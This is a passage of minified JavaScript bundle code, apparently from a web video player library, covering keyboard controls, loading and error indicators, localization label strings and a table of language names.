i=e("./EndStateItem"),r=function(e){this.el=e.el,this._player=e.player,this._addItems(e.items||[])},o=r.prototype;o._addItems=function(e){this._items=[],e.forEach(function(e){var t=document.createElement("div");t.classList.add("end-state-item");var n=new i(Object.assign({},e,{el:t,player:this._player}));this.el.appendChild(t),this._items.push(n)}.bind(this))},o.setData=function(e){for(;this._items.length;)this._items.pop().destroy();this.el.innerHTML="",e?(this.el.classList.remove("hidden"),this._addItems(e.items)):this.el.classList.add("hidden")},o.destroy=function(){for(;this._items.length;)this._items.pop().destroy()},t.exports=r},{"./EndStateItem":361}],363:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.el=document.createElement("div"),this.el.classList.add("error-state-wrapper")}return i(e,[{key:"setText",value:function(e){this._errorStr=e,this.render(),this._container=this.el.firstElementChild}},{key:"focus",value:function(){this._container&&this._container.firstElementChild.focus()}},{key:"render",value:function(){this.el.innerHTML='<div class="error-state-container" >\n\t\t\t<div tabindex="-1" role="text" class="error-state-message">'+this._errorStr+"</div>\n\t\t</div>\n\t\t"}}]),e}();t.exports=r},{}],364:[function(e,t,n){"use strict";var i=function(e,t,n){return function(i){e[t](i,n)}};t.exports=function(e,t,n){return t.classDef?function(e,t,n){return new t.classDef(e,Object.assign(t.options||{},n||{}))}(e,t,n):function(e,t){var n=t.handlers||{},r={};for(var o in n)n.hasOwnProperty(o)&&e.on(o,r[o]=i(n,o,e));var s,a=t.observe;if(a){for(var c=a.update,l=a.source,u=l.on.bind(l)||l.addEventListener,h=l.off.bind(l)||l.removeEventListener,d=a.events,p=0,f=d.length,m=function(){c.call(a,e)};p<f;p++)u(o=d[p],m);s=function(){for(p=0;p<f;p++)o=d[p],h(o,m)}}return{destroy:function(){for(var t in r)r.hasOwnProperty(t)&&e.off(t,r[t]);s&&s()}}}(e,t)}},{}],365:[function(e,t,n){"use strict";var i="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},r=e("./createView"),o=e("./createBehavior"),s=function(e,t){"function"==typeof t.destroy&&t.destroy(),"function"==typeof e.destroy&&e.destroy()},a=function(e){for(;e.length;)e.shift().destroy()},c=function(e){for(var t in e)e.hasOwnProperty(t)&&(a(e[t]),delete e[t])},l=function(e,t,n){var i=r(e,t.view),a=o(i,t.behavior,n);return{view:i,behavior:a,destroy:s.bind(null,i,a)}};t.exports=function(e,t,n){var r={};for(var o in t)if(t.hasOwnProperty(o)&&"object"===i(t[o])){var s=t[o],a=t.elementClassPrefix?"."+t.elementClassPrefix+"-"+s.className:"."+s.className,u=e.querySelectorAll(a);r[o]=[];for(var h=0,d=u.length;h<d;h++)r[o].push(l(u[h],s,n))}return{components:r,destroy:c.bind(null,r)}}},{"./createBehavior":364,"./createView":366}],366:[function(e,t,n){"use strict";t.exports=function(e,t){return new t.classDef(e,t.options)}},{}],367:[function(e,t,n){"use strict";var i=e("@marcom/ac-keyboard/Keyboard"),r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=32,s=37,a=38,c=39,l=40,u=function(e){r.call(this),this._player=e.player,this._target=e.keyboardTarget||this._player.el,this._keyboard=new i(this._target),this._bindMethods(),this._addEventListeners()},h=r.prototype,d=u.prototype=Object.create(h);d._bindMethods=function(){this._onLeftArrowDown=this._onLeftArrowDown.bind(this),this._onRightArrowDown=this._onRightArrowDown.bind(this),this._onUpArrowDown=this._onUpArrowDown.bind(this),this._onDownArrowDown=this._onDownArrowDown.bind(this),this._onSpaceBarUp=this._onSpaceBarUp.bind(this),this._onSpaceBarDown=this._onSpaceBarDown.bind(this),this._onKeyboardInteraction=this._onKeyboardInteraction.bind(this),this._onDurationChange=this._onDurationChange.bind(this),this._boundKeyboardInteraction={},[o,s,c,a,l].forEach(function(e){this._boundKeyboardInteraction[e]=this._onKeyboardInteraction.bind(this,e)}.bind(this))},d._addEventListeners=function(){[o,s,c,a,l].forEach(function(e){this._keyboard.onDown(e,this._boundKeyboardInteraction[e])}.bind(this)),this._keyboard.onDown(o,this._onSpaceBarDown),this._keyboard.onDown(s,this._onLeftArrowDown),this._keyboard.onDown(c,this._onRightArrowDown),this._keyboard.onDown(a,this._onUpArrowDown),this._keyboard.onDown(l,this._onDownArrowDown),this._player.on("durationchange",this._onDurationChange)},d._removeEventListeners=function(){[o,s,c,a,l].forEach(function(e){this._keyboard.offDown(e,this._boundKeyboardInteraction[e])}.bind(this)),this._boundKeyboardInteraction=null,this._keyboard.offDown(o,this._onSpaceBarDown),this._keyboard.offUp(o,this._onSpaceBarUp),this._keyboard.offDown(s,this._onLeftArrowDown),this._keyboard.offDown(c,this._onRightArrowDown),this._keyboard.offDown(a,this._onUpArrowDownDown),this._keyboard.offDown(l,this._onDownArrowDown),this._player.off("durationchange",this._onDurationChange)},d._onKeyboardInteraction=function(){this._triggerKeyboardInteraction()},d._triggerKeyboardInteraction=function(){this.trigger("keyboardinteraction")},d._onDurationChange=function(){var e=this._player.getDuration();this._interval=e>=60?10:e>=20?5:1},d._onLeftArrowDown=function(e){if(!this._player.isLive()){e.originalEvent.preventDefault(),e.originalEvent.stopPropagation();var t=this._player.getCurrentTime();isNaN(t)||this._player.seek(Math.max(t-this._interval,0))}},d._onRightArrowDown=function(e){if(!this._player.isLive()){e.originalEvent.preventDefault(),e.originalEvent.stopPropagation();var t=this._player.getCurrentTime();isNaN(t)||this._player.seek(Math.min(t+this._interval,this._player.getDuration()))}},d._onUpArrowDown=function(e){if(!e.target.hasAttribute("aria-checked")){e.originalEvent.preventDefault(),e.originalEvent.stopPropagation();var t=this._player.getMuted()?0:this._player.getVolume(),n=Math.min(1,t+.1);this._player.setVolume(n),this._player.setMuted(!1)}},d._onDownArrowDown=function(e){if(!e.target.hasAttribute("aria-checked")){e.originalEvent.preventDefault(),e.originalEvent.stopPropagation();var t=this._player.getMuted()?0:this._player.getVolume(),n=Math.max(0,t-.1);this._player.setVolume(n),this._player.setMuted(0===Math.round(10*n))}},d._onSpaceBarDown=function(e){"BUTTON"!==e.target.tagName&&"button"!==e.target.getAttribute("role")&&(this._keyboard.offDown(o,this._onSpaceBarDown),this._keyboard.onUp(o,this._onSpaceBarUp))},d._onSpaceBarUp=function(){this._keyboard.offUp(o,this._onSpaceBarUp),this._player.getPaused()?this._player.play():this._player.pause(),this._keyboard.onDown(o,this._onSpaceBarDown)},d.destroy=function(){this._removeEventListeners(),this._keyboard.destroy(),h.destroy.call(this)},t.exports=u},{"@marcom/ac-event-emitter-micro":122,"@marcom/ac-keyboard/Keyboard":303}],368:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=e("./KeyboardControl"),s=["controls-toggle-mute-volume-button","controls-volume-level-indicator"],a="controls-progress-indicator",c=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e)),i=n._player.get360();return n._arrowControls=!i||i.arrowControls,n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_bindMethods",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_bindMethods",this).call(this),this._onLeftArrowUp=this._onLeftArrowUp.bind(this),this._onRightArrowUp=this._onRightArrowUp.bind(this),this._onDownArrowUp=this._onDownArrowUp.bind(this),this._onUpArrowUp=this._onUpArrowUp.bind(this)}},{key:"_addEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_addEventListeners",this).call(this),this._keyboard.onUp(37,this._onLeftArrowUp),this._keyboard.onUp(39,this._onRightArrowUp),this._keyboard.onUp(38,this._onUpArrowUp),this._keyboard.onUp(40,this._onDownArrowUp)}},{key:"_removeEventListeners",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_removeEventListeners",this).call(this),this._keyboard.offUp(37,this._onLeftArrowUp),this._keyboard.offUp(39,this._onRightArrowUp),this._keyboard.offUp(38,this._onUpArrowUp),this._keyboard.offUp(40,this._onDownArrowUp)}},{key:"_onLeftArrowDown",value:function(e){if(e.target.classList.contains(a))return this._triggerKeyboardInteraction(),void r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onLeftArrowDown",this).call(this,e);this._arrowControls.leftArrowDown(e)}},{key:"_onRightArrowDown",value:function(e){if(e.target.classList.contains(a))return this._triggerKeyboardInteraction(),void r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onRightArrowDown",this).call(this,e);this._arrowControls.rightArrowDown(e)}},{key:"_onUpArrowDown",value:function(e){if(e.target.classList.contains(s[0])||e.target.classList.contains(s[1]))return this._triggerKeyboardInteraction(),void r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onUpArrowDown",this).call(this,e);e.originalEvent.preventDefault(),this._arrowControls.upArrowDown(e)}},{key:"_onDownArrowDown",value:function(e){if(e.target.classList.contains(s[0])||e.target.classList.contains(s[1]))return this._triggerKeyboardInteraction(),void r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_onDownArrowDown",this).call(this,e);e.originalEvent.preventDefault(),this._arrowControls.downArrowDown(e)}},{key:"_onLeftArrowUp",value:function(e){e.target.classList.contains(a)?this._triggerKeyboardInteraction():(e.originalEvent.preventDefault(),this._arrowControls.leftArrowUp(e))}},{key:"_onRightArrowUp",value:function(e){e.target.classList.contains(a)?this._triggerKeyboardInteraction():(e.originalEvent.preventDefault(),this._arrowControls.rightArrowUp(e))}},{key:"_onUpArrowUp",value:function(e){e.target.classList.contains(a)?this._triggerKeyboardInteraction():this._arrowControls.upArrowUp(e)}},{key:"_onDownArrowUp",value:function(e){e.target.classList.contains(a)?this._triggerKeyboardInteraction():this._arrowControls.downArrowUp(e)}},{key:"_onKeyboardInteraction",value:function(e){}},{key:"destroy",value:function(){r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(o);t.exports=c},{"./KeyboardControl":367}],369:[function(e,t,n){"use strict";var i,r;t.exports=function(t){return t.threesixty?(i||(i=e("./ThreeSixtyKeyboardControl")),new i(t)):(r||(r=e("./KeyboardControl")),new r(t))}},{"./KeyboardControl":367,"./ThreeSixtyKeyboardControl":368}],370:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("../localization/Localization"),o="loading",s="was-loading",a=function(){function e(t){var n=this;!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._player=t.player,this.el=t.el,this.el.innerHTML='<div class="loading-indicator">\n        <div></div>\n        <div></div>\n        <div></div>\n        <div></div>\n        <div></div>\n        <div></div>\n        <div></div>\n        <div></div>\n    </div>',this._ariaSpan=this._player.controls.el.querySelector("#loading-status"),this._ariaString="",r.getTranslation({callback:function(e){n._ariaString=e.loading,n._isShowing()&&(n._ariaSpan.innerText=n._ariaString)}}),this._showTimeoutDelay=void 0!==t.showTimeoutDelay?t.showTimeoutDelay:500,this._bindMethods(),this._addEventListeners()}return i(e,[{key:"_bindMethods",value:function(){this.show=this.show.bind(this),this.hide=this.hide.bind(this),this._onPlaying=this._onPlaying.bind(this),this._onSeeking=this._onSeeking.bind(this),this._onSeeked=this._onSeeked.bind(this),this._onPause=this._onPause.bind(this),this._onEnded=this._onEnded.bind(this),this._onError=this._onError.bind(this),this._doShow=this._doShow.bind(this),this._checkLoadingState=this._checkLoadingState.bind(this),this._onPlay=this._onPlay.bind(this),this._onMouseOut=this._onMouseOut.bind(this)}},{key:"_addEventListeners",value:function(){this._player.on("waiting",this.show),this._player.on("seeking",this._onSeeking),this._player.on("seeked",this._onSeeked),this._player.on("playing",this._onPlaying),this._player.on("ended",this._onEnded),this._player.on("canplaythrough",this._checkLoadingState),this._player.on("progress",this._checkLoadingState),this._player.on("error",this._onError),this._player.on("pause",this._onPause),this._player.on("timeupdate",this._checkLoadingState),this._player.on("play",this._onPlay),this._player.controls&&this._player.controls.el.addEventListener("mouseout",this._onMouseOut)}},{key:"_removeEventListeners",value:function(){this._player.off("waiting",this.show),this._player.off("seeking",this._onSeeking),this._player.off("seeked",this._onSeeked),this._player.off("playing",this._onPlaying),this._player.off("ended",this._onEnded),this._player.off("canplaythrough",this._checkLoadingState),this._player.off("progress",this._checkLoadingState),this._player.off("error",this._onError),this._player.off("pause",this._onPause),this._player.off("timeupdate",this._checkLoadingState),this._player.off("play",this._onPlay),this.el.removeEventListener("click",this._onClick),this._player.controls&&this._player.controls.el.removeEventListener("mouseout",this._onMouseOut)}},{key:"_onPause",value:function(){this._isPaused=this._player.getPaused(),this._isPaused&&this.hide()}},{key:"_onPlaying",value:function(){this._isPaused=this._player.getPaused(),this._started=!0,this._checkLoadingState()}},{key:"_onPlay",value:function(){!this._isPaused&&this._started||(this._isPaused=this._player.getPaused(),this._isPaused||(this._started=!0),this._isSeeking=!1,this._checkLoadingState(!0))}},{key:"_onSeeking",value:function(){this._isSeeking=!0,this.show()}},{key:"_onSeeked",value:function(){this._isSeeking=!1,this._checkLoadingState()}},{key:"_onEnded",value:function(){this._started=!1,this.hide()}},{key:"_onError",value:function(){this._started&&this.show(!0)}},{key:"_onMouseOut",value:function(){this._player.isStalled()||this._player.el.classList.remove(s)}},{key:"show",value:function(e){this._isPaused||(!0!==e&&this._started?(clearTimeout(this._showTimeout),this._showTimeout=setTimeout(this._doShow,this._showTimeoutDelay)):this._doShow())}},{key:"_checkLoadingState",value:function(e){!this._player.getEnded()&&this._started&&(this._player.isStalled()||this._isSeeking)?this.show(!0===e):this.hide()}},{key:"_isShowing",value:function(){return this._player.el.classList.contains(o)}},{key:"_doShow",value:function(){this._player.el.classList.add(o),this._player.el.classList.remove(s),this._ariaSpan.innerText=this._ariaString}},{key:"hide",value:function(){clearTimeout(this._showTimeout),this._isShowing()&&(this._player.el.classList.remove(o),this._player.el.classList.contains("user-hover")||this._player.el.classList.add(s),this._ariaSpan.innerText="")}},{key:"destroy",value:function(){this._removeEventListeners()}}]),e}();t.exports=a},{"../localization/Localization":373}],371:[function(e,t,n){"use strict";t.exports={audiotrackscontrol:"Audio",playpause:"Play/Pause",play:"Play",pause:"Pause",togglemutevolume:"Toggle Mute Volume",fullscreen:"Full Screen",exitfullscreen:"Exit Full Screen",airplay:"AirPlay",captionscontrol:"Closed Captions",captionsturnedon:"Closed Captions On",captionsturnedoff:"Closed Captions Off",subtitlescontrol:"Subtitles",subtitlesturnedon:"Subtitles On",subtitlesturnedoff:"Subtitles Off",share:"Share",elapsed:"elapsed",remaining:"remaining",currenttimetext:"{minutes} minutes and {seconds} seconds",pictureinpicture:"Picture-in-Picture",exitpictureinpicture:"Exit Picture-in-Picture",closesharing:"Close Sharing",facebookshare:"Share to Facebook",twittershare:"Share to Twitter",copylink:"Copy Link",copyembed:"Copy Embed Code",copyarea:"Copy Link Text Area",selectlink:"Select Link Text",selectembed:"Select Embed Code",close:"Close",dismisscopy:"Dismiss Copy",replay:"Replay",live:"Live",livestream:"Live Streaming",newwindow:"Opens in New Window",threesixtyicon:"Return 360 Point of View to Origin",threesixtyleft:"Move 360 Point of View Left",threesixtyright:"Move 360 Point of View Right",threesixtyup:"Move 360 Point of View Up",threesixtydown:"Move 360 Point of View Down",error:"The video could not be played.",jumptochapter:"Jump to chapter",chapter:"{chaptertitle} Chapter {chaptertime}",minutesandseconds:"{minutes} minutes and {seconds} seconds",loading:"The video is loading",captionsoff:"Off"}},{}],372:[function(e,t,n){"use strict";t.exports={af:"Afrikaans","af-ZA":"Afrikaans [South Africa]",ar:"Arabic","ar-AE":"Arabic [UAE]","ar-BH":"Arabic [Bahrain]","ar-DZ":"Arabic [Algeria]","ar-EG":"Arabic [Egypt]","ar-IQ":"Arabic [Iraq]","ar-JO":"Arabic [Jordan]","ar-KW":"Arabic [Kuwait]","ar-LB":"Arabic [Lebanon]","ar-LY":"Arabic [Libya]","ar-MA":"Arabic [Morocco]","ar-OM":"Arabic [Oman]","ar-QA":"Arabic [Qatar]","ar-SA":"Arabic [Saudi Arabia]","ar-SY":"Arabic [Syria]","ar-TN":"Arabic [Tunisia]","ar-YE":"Arabic [Yemen]",az:"Azeri [Latin]","az-AZ":"Azeri [Cyrillic] [Azerbaijan]",be:"Belarusian","be-BY":"Belarusian [Belarus]",bg:"Bulgarian","bg-BG":"Bulgarian [Bulgaria]","bs-BA":"Bosnian [Bosnia and Herzegovina]",ca:"Catalan","ca-ES":"Catalan [Spain]",cs:"Czech","cs-CZ":"Czech [Czech Rep]",cy:"Welsh","cy-GB":"Welsh [United Kingdom]",da:"Danish","da-DK":"Danish [Denmark]",de:"German","de-AT":"German [Austria]","de-CH":"German [Switzerland]","de-DE":"German [Germany]","de-LI":"German [Liechtenstein]","de-LU":"German [Luxembourg]",dv:"Divehi","dv-MV":"Divehi [Maldives]",el:"Greek","el-GR":"Greek [Greece]",en:"English","en-AU":"English [Australia]","en-BZ":"English [Belize]","en-CA":"English [Canada]","en-CB":"English [Caribbean]","en-GB":"English [United Kingdom]","en-IE":"English [Ireland]","en-JM":"English [Jamaica]","en-NZ":"English [New Zealand]","en-PH":"English [Philippines]","en-TT":"English [Trinidad and Tobago]","en-US":"English [US]","en-ZA":"English [South Africa]","en-ZW":"English [Zimbabwe]","en-419":"English [Latin America]","en-AE":"English [UAE]","en-AM":"English [Armenia]","en-AZ":"English [Azerbaijan]","en-BH":"English [Bahrain]","en-BW":"English [Botswana]","en-BY":"English [Belarus]","en-EG":"English [Egypt]","en-GE":"English [Georgia]","en-GW":"English [Guinea Bissau]","en-HK":"English [Hong Kong]","en-IL":"English [Israel]","en-IN":"English [India]","en-JO":"English [Jordan]","en-KE":"English [Kenya]","en-KG":"English [Kyrgyzstan]","en-KW":"English [Kuwait]","en-KZ":"English [Kazakhstan]","en-MD":"English [Republic of Moldova]","en-ME":"English [Montenegro]","en-MK":"English [Macedonia]","en-MT":"English [Malta]","en-MY":"English [Malaysia]","en-MZ":"English [Mozambique]","en-NG":"English [Nigeria]","en-OM":"English [Oman]","en-QA":"English [Qatar]","en-SA":"English [Saudi Arabia]","en-SG":"English [Singapore]","en-SI":"English [Slovenia]","en-TJ":"English [Tajikistan]","en-TM":"English [Turkmenistan]","en-UG":"English [Uganda]","en-UZ":"English [Uzbekistan]","en-VN":"English [Vietnam]",eo:"Esperanto",es:"Spanish","es-419":"Spanish [Latin America]","es-AR":"Spanish [Argentina]","es-BO":"Spanish [Bolivia]","es-CL":"Spanish [Chile]","es-CO":"Spanish [Colombia]","es-CR":"Spanish [Costa Rica]","es-DO":"Spanish [Dominican Republic]","es-EC":"Spanish [Ecuador]","es-ES":"Spanish [Spain]","es-GT":"Spanish [Guatemala]","es-HN":"Spanish [Honduras]","es-MX":"Spanish [Mexico]","es-NI":"Spanish [Nicaragua]","es-PA":"Spanish [Panama]","es-PE":"Spanish [Peru]","es-PR":"Spanish [Puerto Rico]","es-PY":"Spanish [Paraguay]","es-SV":"Spanish [El Salvador]","es-UY":"Spanish [Uruguay]","es-VE":"Spanish [Venezuela]",et:"Estonian","et-EE":"Estonian [Estonia]",eu:"Basque","eu-ES":"Basque [Spain]",fa:"Farsi","fa-IR":"Farsi [Iran]",fi:"Finnish","fi-FI":"Finnish [Finland]",fo:"Faroese","fo-FO":"Faroese [Faroe Islands]",fr:"French","fr-BE":"French [Belgium]","fr-CA":"French [Canada]","fr-CH":"French [Switzerland]","fr-FR":"French [France]","fr-LU":"French [Luxembourg]","fr-MC":"French [Principality of Monaco]","fr-CF":"French [CentralAfrica]","fr-CI":"French [Ivory Coast]","fr-CM":"French [Cameroon]","fr-GN":"French [Guinea]","fr-GQ":"French [Equatorial Guinea]","fr-MA":"French [Morocco]","fr-MG":"French [Madagascar]","fr-ML":"French [Mali]","fr-MU":"French [Mauritius]","fr-NE":"French [Niger]","fr-SN":"French [Senegal]","fr-TN":"French [Tunisia]",gl:"Galician","gl-ES":"Galician [Spain]",gu:"Gujarati","gu-IN":"Gujarati [India]",he:"Hebrew","he-IL":"Hebrew [Israel]",hi:"Hindi","hi-IN":"Hindi [India]",hr:"Croatian","hr-BA":"Croatian [Bosnia and Herzegovina]","hr-HR":"Croatian [Croatia]",hu:"Hungarian","hu-HU":"Hungarian [Hungary]",hy:"Armenian","hy-AM":"Armenian [Armenia]",id:"Indonesian","id-ID":"Indonesian [Indonesia]",is:"Icelandic","is-IS":"Icelandic [Iceland]",it:"Italian","it-CH":"Italian [Switzerland]","it-IT":"Italian [Italy]",ja:"Japanese","ja-JP":"Japanese [Japan]",ka:"Georgian","ka-GE":"Georgian [Georgia]",kk:"Kazakh","kk-KZ":"Kazakh [Kazakhstan]",kn:"Kannada","kn-IN":"Kannada [India]",ko:"Korean","ko-KR":"Korean [Korea]",kok:"Konkani","kok-IN":"Konkani [India]",ky:"Kyrgyz","ky-KG":"Kyrgyz [Kyrgyzstan]",lt:"Lithuanian","lt-LT":"Lituanian [Lithuania]",lv:"Latvian","lv-LV":"Latvian [Latvia]",mi:"Maori","mi-NZ":"Maori [New Zealand]",mk:"FYRO Macedonian","mk-MK":"FYRO Macedonian [Former Yugoslav Republic of Macedonia]",mn:"Mongolian","mn-MN":"Mongolian [Mongolia]",mr:"Marathi","mr-IN":"Marathi [India]",ms:"Malay","ms-BN":"Malay [Brunei Darussalam]","ms-MY":"Malay [Malaysia]",mt:"Maltese","mt-MT":"Maltese [Malta]",nb:"Norwegian [Bokm?l]","nb-NO":"Norwegian [Bokm?l] [Norway]",nl:"Dutch","nl-BE":"Dutch [Belgium]","nl-NL":"Dutch [Netherlands]","nn-NO":"Norwegian [Nynorsk] [Norway]",no:"Norwegian",ns:"Northern Sotho","ns-ZA":"Northern Sotho [South Africa]",pa:"Punjabi","pa-IN":"Punjabi [India]",pl:"Polish","pl-PL":"Polish [Poland]",ps:"Pashto","ps-AR":"Pashto [Afghanistan]",pt:"Portuguese","pt-BR":"Portuguese [Brazil]","pt-PT":"Portuguese [Portugal]",qu:"Quechua","qu-BO":"Quechua [Bolivia]","qu-EC":"Quechua [Ecuador]","qu-PE":"Quechua [Peru]",ro:"Romanian","ro-RO":"Romanian [Romania]",ru:"Russian","ru-RU":"Russian [Russia]",sa:"Sanskrit","sa-IN":"Sanskrit [India]",se:"Sami [Northern]","se-FI":"Sami [Inari] [Finland]","se-NO":"Sami [Southern] [Norway]","se-SE":"Sami [Southern] [Sweden]",sk:"Slovak","sk-SK":"Slovak [Slovakia]",sl:"Slovenian","sl-SI":"Slovenian [Slovenia]",sq:"Albanian","sq-AL":"Albanian [Albania]","sr-BA":"Serbian [Cyrillic] [Bosnia and Herzegovina]","sr-SP":"Serbian [Cyrillic] [Serbia and Montenegro]",sv:"Swedish","sv-FI":"Swedish [Finland]","sv-SE":"Swedish [Sweden]",sw:"Swahili","sw-KE":"Swahili [Kenya]",syr:"Syriac","syr-SY":"Syriac [Syria]",ta:"Tamil","ta-IN":"Tamil [India]",te:"Telugu","te-IN":"Telugu [India]",th:"Thai","th-TH":"Thai [Thailand]",tl:"Tagalog","tl-PH":"Tagalog [Philippines]",tn:"Tswana","tn-ZA":"Tswana [South Africa]",tr:"Turkish","tr-TR":"Turkish [Turkey]",ts:"Tsonga",tt:"Tatar","tt-RU":"Tatar [Russia]",uk:"Ukrainian","uk-UA":"Ukrainian [Ukraine]",ur:"Urdu","ur-PK":"Urdu [Islamic Republic of Pakistan]",uz:"Uzbek [Latin]","uz-UZ":"Uzbek [Cyrillic] [Uzbekistan]",vi:"Vietnamese","vi-VN":"Vietnamese [Viet Nam]",xh:"Xhosa","xh-ZA":"Xhosa [South Africa]",zh:"Chinese","zh-CN":"Chinese [S]","zh-HK":"Chinese [Hong Kong]","zh-MO":"Chinese [Macau]","zh-SG":"Chinese [Singapore]","zh-TW":"Chinese [T]","zh-hans":"Chinese [Simplified]",zu:"Zulu","zu-ZA":"Zulu [South Africa]"}},{}],373:[function(e,t,n){"use strict";var i=e("./Translations"),r=e("./DefaultLabelStrings"),o=window.document.documentElement,s=void 0;try{s=window.top.document.documentElement}catch(e){s=o}var a=e("@marcom/ac-ajax-xhr"),c={},l=function(e){var t=void 0;try{t=e||s.getAttribute("lang")}catch(e){t=o.getAttribute("lang")}var n=void 0;if(t)switch(t.toLowerCase()){case"es-418":n="es-LA";break;case"pt":n="pt-BR";break;default:n=t}else n="en-US";return n},u=function(e){return e=l(e),void 0!==c[e]};t.exports={getLanguage:l,getTranslation:function(e){var t=l((e=e||{}).lang);if(u(t))return e.callback?(e.callback(c[t]),null):c[t];if(!e.callback)throw new Error("To use Localization.getTranslation you must either pass a callback or ensure the translation is ready via Localization.translationReady");var n=e.basePath||"/ac/ac-video/latest/json/localization/",o=i[t]?n+i[t]:n+i["en-US"],s=r,h=function(){c[t]=s,e.callback(s)};return e.forceEnglishLabels?(h(),c[t]):(a.get(o,{success:function(n){try{s=Object.assign(s,JSON.parse(n)),c[t]=s,e.callback(s)}catch(e){h()}},error:h}),null)},translationReady:u}},{"./DefaultLabelStrings":371,"./Translations":374,"@marcom/ac-ajax-xhr":35}],374:[function(e,t,n){"use strict";t.exports={"bg-BG":"bg-BG.json","cs-CZ":"cs-CZ.json","el-GR":"el-GR.json","de-AT":"de-AT.json","de-CH":"de-CH.json","de-DE":"de-DE.json","de-LI":"de-LI.json","da-DK":"da-DK.json",en:"en.json","en-AP":"en-AP.json","en-AU":"en-AU.json","en-AZ":"en-AZ.json","en-BH":"en-BH.json","en-BY":"en-BY.json","en-CA":"en-CA.json","en-EG":"en-EG.json","en-GB":"en-GB.json","en-GE":"en-GE.json","en-HK":"en-HK.json","en-IE":"en-IE.json","en-IN":"en-IN.json","en-JO":"en-JO.json","en-KG":"en-KG.json","en-KR":"en-KR.json","en-KW":"en-KW.json","en-KZ":"en-KZ.json","en-NZ":"en-NZ.json","en-OM":"en-OM.json","en-QA":"en-QA.json","en-SA":"en-SA.json","en-SG":"en-SG.json","en-TJ":"en-TJ.json","en-TM":"en-TM.json","en-US":"en-US.json","en-UZ":"en-UZ.json","en-ZA":"en-ZA.json",es:"es.json","es-LA":"es-LA.json","es-MX":"es-MX.json","es-ES":"es-ES.json","et-EE":"et-EE.json","fi-FI":"fi-FI.json",fr:"fr.json","fr-BE":"fr-BE.json","fr-CA":"fr-CA.json","fr-CH":"fr-CH.json","fr-FR":"fr-FR.json","hr-HR":"hr-HR.json","hu-HU":"hu-HU.json","it-IT":"it-IT.json",ja:"ja.json","ja-JP":"ja-JP.json","ko-KR":"ko-KR.json","lt-LT":"lt-LT.json","lv-LV":"lv-LV.json","nl-BE":"nl-BE.json","nl-NL":"nl-NL.json","no-NO":"no-NO.json","pl-PL":"pl-PL.json",pt:"pt.json","pt-BR":"pt-BR.json","pt-PT":"pt-PT.json","ro-RO":"ro-RO.json","ru-RU":"ru-RU.json","sk-SK":"sk-SK.json","sv-SE":"sv-SE.json","tr-TR":"tr-TR.json","uk-UA":"uk-UA.json","vn-VN":"vn-VN.json",zh:"zh.json","zh-CN":"zh-CN.json","zh-HK":"zh-HK.json","zh-TW":"zh-TW.json"}},{}],375:[function(e,t,n){"use strict";var i=e("./PopUp"),r=function(e){this.el=e.el,this._player=e.player,this._popUp=new i(e),this.el.appendChild(this._popUp.el)},o=r.prototype;o.setData=function(e){this._popUp.setData(e)},o.show=function(){this.el.classList.remove("hidden"),this._popUp.show()},o.hide=function(){this.el.classList.add("hidden"),this._popUp.hide()},o.setPopUpPosition=function(e){this._popUp.setPopUpPosition(e)},o.destroy=function(){this._popUp.destroy()},t.exports=r},{"./PopUp":376}],376:[function(e,t,n){"use strict";var i=e("../templates/overlays/trickplay-overlay.html"),r=e("../../utils/Time"),o=e("./ThumbnailHandler"),s=e("@marcom/function-utils/throttle"),a=e("../../utils/liveStreamLookback"),c=function(e){this._player=e.player,this.el=document.createElement("div"),this.el.style.opacity="0",this.el.innerHTML=i,this._player.isDvr()?this._liveStreamLookback=a:this._liveStreamLookback=0,this._thumbnailHandler=new 